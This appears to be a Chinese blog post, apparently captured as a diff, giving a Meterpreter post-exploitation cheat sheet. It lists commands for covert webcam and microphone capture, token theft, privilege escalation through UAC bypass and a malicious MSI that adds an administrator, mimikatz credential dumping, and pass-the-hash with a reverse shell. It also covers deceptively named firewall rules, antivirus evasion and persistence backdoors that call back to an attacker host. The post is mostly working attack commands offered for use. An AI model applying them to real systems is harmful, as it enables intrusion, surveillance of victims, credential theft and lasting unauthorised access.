+<h3 id="sniffer抓包"><a href="#sniffer抓包" class="headerlink" title="sniffer抓包"></a>sniffer抓包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   # 查看网卡</span><br><span class="line">sniffer_start 1   # 选择网卡1开始抓包</span><br><span class="line">sniffer_stats 1   # 查看网卡1状态</span><br><span class="line">sniffer_dump 1 /tmp/wlan1.pcap  # 导出pcap数据包</span><br><span class="line">sniffer_stop 1   # 停止网卡1抓包</span><br><span class="line">sniffer_release 1 # 释放网卡1流量</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="窃取令牌"><a href="#窃取令牌" class="headerlink" title="窃取令牌"></a>窃取令牌</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   # 从指定进程中窃取token  </span><br><span class="line">drop_token  # 停止假冒当前的token</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="网络摄像头"><a href="#网络摄像头" class="headerlink" title="网络摄像头"></a>网络摄像头</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">record_mic　 # 音频录制</span><br><span class="line">webcam_chat  # 开启视频聊天(对方有弹窗）</span><br><span class="line">webcam_list  # 查看摄像头</span><br><span class="line">webcam_snap  # 通过摄像头拍照</span><br><span class="line">webcam_stream  # 通过摄像头开启视频监控(以网页形式进行监控≈直播）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screenshot  # 截屏</span><br><span class="line">use espia  # 使用espia模块</span><br><span class="line">screengrab  # 截屏</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h2><h3 id="getsystem提权"><a href="#getsystem提权" class="headerlink" title="getsystem提权"></a>getsystem提权</h3><p>利用getsystem命令提权，该命令会自动寻找各种可能的提权技术来使得用户将权限提升到更高的级别。提权方式采用命令管道模拟提升的方法和令牌复制的方法。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地漏洞提权"><a href="#本地漏洞提权" class="headerlink" title="本地漏洞提权"></a>本地漏洞提权</h3><p>本地漏洞提权即是通过运行一些造成溢出漏洞的exploit,把用户从普通权限提升为管理员权限。<br>1.利用getuid查看已获得权限，尝试利用getsystem提权，失败。</p>
+<p>2.利用enum_patches模块搜集补丁信息，然后寻找可利用的exploits进行提权。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">background</span><br><span class="line">search MS10-015</span><br><span class="line">use exploit/windows/local/ms10_015_kitrap0d</span><br><span class="line">set session 8</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>绕过UAC提权<br>使用bypassuac提权<br>msf内置一些bypassuac脚本，原理不同，使用方法类似，执行后返回一个新的会话，再次执行getsystem即可提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/local/bypassuac_silentcleanup</span><br><span class="line">exploit/windows/local/bypassuac_vbs</span><br></pre></td></tr></table></figure>
+
+<p>使用命令getsystem提权失败，然后利用bypassuac来提权，这里利用exploit/windows/local/bypassuac模块(32位、64位都有效)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>使用RunAs提权<br>该方法利用exploit/windows/local/ask模块(32位、64位都有效)，创建一个可执行文件并在目标机上发起一个提升权限请求的程序，触发系统UAC，提示用户是否要继续，如果用户选择“是”，则会返回一个高权限的meterpreter shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br><span class="line">set filename update.exe  # 设置反弹程序名称</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>输入run命令以后会在目标机上弹出UAC，提示用户是否允许，选择是就会返回一个高权限的meterpreter shell。</p>
+<p><strong>注意事项：</strong><br>使用RunAs模块进行提权时，系统当前用户须在管理员组或者知道管理员的密码，用户账户控制程序UAC设置则没有要求。使用RunAs模块进行提权时，会创建一个可执行文件，为了避免给杀毒软件查杀，该可执行文件（需进行免杀处理）的创建要使用EXE::Custom选项。</p>
+<p>假冒令牌提权<br>令牌是系统临时密钥，它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源。这些令牌将持续存在于系统中，除非系统重新启动。一般有两种类型的令牌，一种是Delegation Tokens，也就是授权令牌，它支持交互式登录（例如远程桌面登陆登录）。还有一种是Impersonation Tokens，也就是模拟令牌，它是非交互的会话（例如访问文件共享）。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use incognito    # 加载窃取令牌模块 </span><br><span class="line">list_tokens -u    # 查看可用的用户令牌</span><br><span class="line">list_tokens -g    # 查看可用的用户组令牌</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  # 假冒SYSTEM token</span><br><span class="line">rev2self   #返回原始token</span><br></pre></td></tr></table></figure>
+
+<p>利用AlwaysInstallElevated提权<br>AlwaysInstallElevated是一个策略设置。微软允许非授权用户以SYSTEM权限运行安装文件(MSI)，如果用户启用此策略设置，那么黑客利用恶意的MSI文件就可以进行管理员权限的提升。</p>
+<p>查看AlwaysInstallElevated是否被定义<br>不过利用此方法有个前提条件，需要有两个注册表的键值为1，我们可以在cmdshell下查看AlwaysInstallElevated是否被定义</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<p>如上图所示已经开启AlwaysInstallElevated，如果在组策略里未定义AlwaysInstallElevated，则会出现“错误: 系统找不到指定的注册表项或值”的提示，如下图所示：</p>
+<p>如果需要开启可以选择以下方法：<br>1.打开组策略编辑器（运行框输入gpedit.msc）<br>2.组策略-&gt;计算机配置-&gt;管理模版-&gt;Windows组件-&gt;Windows Installer-&gt;永远以高特权进行安装：选择启用<br>3.组策略-&gt;用户配置-&gt;管理模版-&gt;Windows组件-&gt;Windows Installer-&gt;永远以高特权进行安装：选择启用</p>
+<p>设置完成后对应注册表的位置值会设为1，开启AlwaysInstallElevated。</p>
+<p>生成MSI安装文件<br>利用msfvenom命令生成一个在目标机上增加管理员用户的MSI安装文件，这里密码要设置为强密码，否则会报错。</p>
+<p>msfvenom -p windows/adduser USER=msi PASS=Abc123@@ -f msi -o msi.msi<br>1<br>上传并执行MSI文件<br>upload msi.msi c:\Users\test # 部分目录由于权限原因可能上传失败<br>msiexec /quiet /qn /i msi.msi  # /quiet=安装过程中禁止向用户发送消息 /qn=不使用图形界面 /i=安装程序<br>net localgroup administrators</p>
+<p>执行成功后查看管理员组发现用户已经添加成功</p>
+<p><strong>注意：</strong><br>由于是msf生成的msi文件，所以默认会被杀毒软件拦截，需要做好免杀。</p>
+<h2 id="0x06-窃取hash及密码-amp-哈希传递"><a href="#0x06-窃取hash及密码-amp-哈希传递" class="headerlink" title="0x06 窃取hash及密码&amp;哈希传递"></a>0x06 窃取hash及密码&amp;哈希传递</h2><h3 id="窃取hash及密码"><a href="#窃取hash及密码" class="headerlink" title="窃取hash及密码"></a>窃取hash及密码</h3><h4 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hashdump</span><br><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+
+<p>mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load mimikatz # 加载mimikatz模块</span><br><span class="line">msv  # 获取用户和hash值 </span><br><span class="line">kerberos  # 获取内存中的明文密码信息</span><br><span class="line">wdigest  # 获取内存中的明文密码信息</span><br><span class="line">mimikatz_command -f a:: # 需要以错误的模块来让正确的模块显示</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords # 获取用户密码</span><br><span class="line">mimikatz_command -f samdump::hashes  # 执行用户hash</span><br></pre></td></tr></table></figure>
+
+<h4 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h4><p>kiwi是利用的mimikatz扩展，运行需要SYSTEM权限</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+<p>哈希传递<br>利用hashdump得到用户的hash后可利用psexec模块进行哈希传递攻击。<br>使用psexec的前提：SMB服务必须开启，也就是开启445端口；Admin$可以访问。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.183.147</span><br><span class="line">set LPORT 443</span><br><span class="line">set RHOST 192.168.183.154</span><br><span class="line">set SMBUSER Administrator</span><br><span class="line">set SMBPASS ccf**4ee:3db**678</span><br><span class="line">set SMBDOMAIN  WORKGROUP   # 域用户需要设置SMBDOMAIN</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-RDP"><a href="#0x07-RDP" class="headerlink" title="0x07 RDP"></a>0x07 RDP</h2><p>开启3389<br>getgui命令<br>这里需要注意的是通过getgui命令，虽然可以成功添加用户，但是没有权限远程登录桌面，这里推荐使用enable_rdp脚本添加。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run getgui –h  # 查看帮助</span><br><span class="line">run getgui -e  # 开启远程桌面</span><br><span class="line">run getgui -u admin -p admin  # 添加用户</span><br><span class="line">run getgui -f 6666 -e  # 3389端口转发到6666</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>enable_rdp脚本<br>通过enable_rdp脚本将用户添加到远程桌面用户组和管理员用户组</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=admin PASSWORD=admin # 添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6667  # 将3389端口转发到6667</span><br></pre></td></tr></table></figure>
+
+<p>远程桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enumdesktops  # 查看可用的桌面</span><br><span class="line">getdesktop    # 获取当前meterpreter 关联的桌面</span><br><span class="line">setdesktop    # 设置meterpreter关联的桌面  -h查看帮助</span><br><span class="line">run vnc   # 使用vnc远程桌面连接</span><br><span class="line">rdesktop 127.0.0.1:1111 # 需要输入用户名密码连接</span><br><span class="line">rdesktop -u Administrator -p 123 127.0.0.1:1111 # -u 用户名 -p 密码</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-注册表操作"><a href="#0x08-注册表操作" class="headerlink" title="0x08 注册表操作"></a>0x08 注册表操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg –h  # 查看帮助</span><br><span class="line">-k 注册表的路径 -v 键的名称 -d 键值 </span><br><span class="line">reg enumkey [-k &lt;key&gt;]  # 枚举注册表的内容</span><br><span class="line">reg createkey [-k &lt;key&gt;]  # 创建注册表项</span><br><span class="line">reg deletekey [-k &lt;key&gt;]  # 删除注册表项</span><br><span class="line">reg setval [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]  # 在注册表里添加内容</span><br><span class="line">reg deleteval [-k &lt;key&gt; -v &lt;val&gt;]  # 删除注册表的值</span><br><span class="line">reg queryval [-k &lt;key&gt; -v &lt;val&gt;]  # 查询注册表的值</span><br></pre></td></tr></table></figure>
+
+<p>2.设置防火墙允许通过443端口（如果目标主机开启防火墙，没有设置相应的规则可能会导致连接失败。）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">netsh firewall show opmode # 查看防火墙状态</span><br><span class="line">netsh firewall add portopening TCP 443 &quot;网络发现(Pub PSD-Out)&quot; ENABLE ALL # 添加防火墙的规则允许443端口通过(这里“网络发现(Pub PSD-Out)”是规则名称，目的是为了迷惑管理员。) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-后门植入"><a href="#0x09-后门植入" class="headerlink" title="0x09 后门植入"></a>0x09 后门植入</h2><p>在我们通过漏洞获取到目标主机权限之后，如果目标主机主机重启亦或是管理员发现并修补了漏洞，那么我们就会失去对服务器的控制权，所以我们需要通过植入后门来维持权限，前面说的nc后门就是其中一种，另外一般还有Persistence和Metsvc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Persistence(通过启动项安装)</span><br><span class="line">run persistence –h  # 查看帮助</span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.183.147 </span><br><span class="line">run persistence -U -i 5 -p 4444 -r 192.168.183.147 -L c:\\Windows\\System32</span><br><span class="line">-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限原因会导致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数</span><br><span class="line">-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息</span><br><span class="line">-L：后门传到远程主机的位置默认为%TEMP%</span><br><span class="line">-i：设置反向连接间隔时间为5秒</span><br><span class="line">-p：设置反向连接的端口号</span><br><span class="line">-r：设置反向连接的ip地址</span><br></pre></td></tr></table></figure>
+
+<p>Metsvc(通过服务安装)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run metsvc -h   # 查看帮助</span><br><span class="line">run metsvc -A   # 自动安装后门</span><br><span class="line">run metsvc -r   # 删除后门</span><br><span class="line"></span><br><span class="line">连接后门</span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set rhost 192.168.183.169</span><br><span class="line">set lport 31337</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">北孤清茶lth</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/">http://example.com/2022/01/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">北孤清茶lthの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/05/24/%E5%86%85%E7%BD%91%E5%A5%BD%E7%94%A8%E7%9A%84%E5%8D%9A%E5%AE%A2/"><img class="prev-cover" src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2021/11/25/ctfshow_web478/"><img class="next-cover" src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">北孤清茶lth</div><div class="author-info__description">努力让生活更美好</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lth714"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lth714" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1306209041@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">这是我新搭建的博客，有很多不好的地方，请多多关照！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">信息收集命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%9C%BA%E5%99%A8%E6%98%AF%E5%90%A6%E5%A4%84%E5%9C%A8%E5%86%85%E7%BD%91%E4%B8%AD%E3%80%81%E6%9C%89%E5%87%A0%E4%B8%AA%E5%86%85%E7%BD%91%E3%80%81%E5%86%85%E7%BD%91%E6%AE%B5%E5%88%86%E5%88%AB%E6%98%AF%E5%A4%9A%E5%B0%91%E3%80%81%E6%98%AF%E5%90%A6%E6%98%AF%E5%9F%9F%E5%86%85%E7%BD%91%E3%80%81%E7%BD%91%E5%85%B3-IP-%E5%9C%B0%E5%9D%80%E3%80%81DNS-%E6%8C%87%E5%90%91%E7%9A%84-IP-%E5%9C%B0%E5%9D%80%E7%AD%89%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">1，执行如下命令，可以获取当前机器是否处在内网中、有几个内网、内网段分别是多少、是否是域内网、网关 IP 地址、DNS 指向的 IP 地址等信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%8C%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">2，获取系统和版本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AF%E4%B8%AD%E6%96%87%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%8C%E8%BE%93%E5%85%A5%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">3，如果是中文操作系统，输入如下命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%EF%BC%8C%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">4，查看系统体系结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%8F%8A%E7%89%88%E6%9C%AC%E3%80%81%E8%B7%AF%E5%BE%84%E7%AD%89"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">5,查看安装的软件及版本、路径等</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%88%A9%E7%94%A8powershell%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%94%B6%E9%9B%86%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%85%B7%E4%BD%93%E5%A6%82%E4%B8%8B"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">6,利用powershell命令，收集软件版本信息，具体如下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%EF%BC%8C%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">7，查询本机服务信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E6%9F%A5%E8%AF%A2%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8"><span class="toc-number">1.0.0.8.</span> <span class="toc-text">8,查询进程列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.0.9.</span> <span class="toc-text">9,查看启动程序信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.0.0.10.</span> <span class="toc-text">10,查看计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4"><span class="toc-number">1.0.0.11.</span> <span class="toc-text">11,查看主机开机时间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">1.0.0.12.</span> <span class="toc-text">12,查询用户列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13%EF%BC%8C%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.0.13.</span> <span class="toc-text">13，获取本地管理员组的信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7"><span class="toc-number">1.0.0.14.</span> <span class="toc-text">14,查看当前在线用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#15-%E5%88%97%E5%87%BA%E6%88%96%E6%96%AD%E5%BC%80%E6%9C%AC%E5%9C%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%92%8C%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E4%BC%9A%E8%AF%9D"><span class="toc-number">1.0.0.15.</span> <span class="toc-text">15,列出或断开本地计算机和连接的客户端的会话</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16-%E6%9F%A5%E8%AF%A2%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8"><span class="toc-number">1.0.0.16.</span> <span class="toc-text">16,查询端口列表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#17-%E6%9F%A5%E8%AF%A2%E8%A1%A5%E4%B8%81%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.0.17.</span> <span class="toc-text">17 ,查询补丁信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#18-%E4%BD%BF%E7%94%A8wmic-%E8%AF%86%E5%88%AB%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E8%A1%A5%E4%B8%81%E6%83%85%E5%86%B5"><span class="toc-number">1.0.0.18.</span> <span class="toc-text">18,使用wmic 识别安装系统中的补丁情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#19%EF%BC%8C%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B"><span class="toc-number">1.0.0.19.</span> <span class="toc-text">19，查询本机共享，命令如下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#20-%E6%9F%A5%E7%9C%8B%E8%B7%AF%E7%94%B1%E8%A1%A8%E5%8F%8A%E6%89%80%E6%9C%89%E5%8F%AF%E7%94%A8%E6%8E%A5%E5%8F%A3%E7%9A%84arp%E7%BC%93%E5%AD%98%E8%A1%A8"><span class="toc-number">1.0.0.20.</span> <span class="toc-text">20,查看路由表及所有可用接口的arp缓存表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#21-%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.0.21.</span> <span class="toc-text">21,关闭防火墙命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#22-%E6%9F%A5%E7%9C%8B%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE"><span class="toc-number">1.0.0.22.</span> <span class="toc-text">22,查看防火墙配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#23-%E4%BF%AE%E6%94%B9%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE"><span class="toc-number">1.0.0.23.</span> <span class="toc-text">23,修改防火墙配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#24-%E6%9F%A5%E7%9C%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE%E6%83%85%E5%86%B5"><span class="toc-number">1.0.0.24.</span> <span class="toc-text">24,查看计算机代理配置情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#25-%E6%9F%A5%E8%AF%A2%E5%B9%B6%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.0.0.25.</span> <span class="toc-text">25,查询并开启远程连接服务</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">2.知识总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E4%B8%8A%E5%91%BD%E4%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">网上命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.1.</span> <span class="toc-text">本机信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.</span> <span class="toc-text">自动化的信息收集脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.3.</span> <span class="toc-text">域内信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8telnet%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.3.1.</span> <span class="toc-text">利用telnet工具进行端口扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerSploit-%E4%B8%AD%E7%9A%84Invoke-portscan-ps1%E8%84%9A%E6%9C%AC"><span class="toc-number">3.4.</span> <span class="toc-text">PowerSploit 中的Invoke-portscan.ps1脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nishang-%E4%B8%AD%E7%9A%84Invoke-portscan-ps1%E8%84%9A%E6%9C%AC"><span class="toc-number">3.5.</span> <span class="toc-text">Nishang 中的Invoke-portscan.ps1脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97"><span class="toc-number">3.6.</span> <span class="toc-text">Metasploit 端口扫描模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 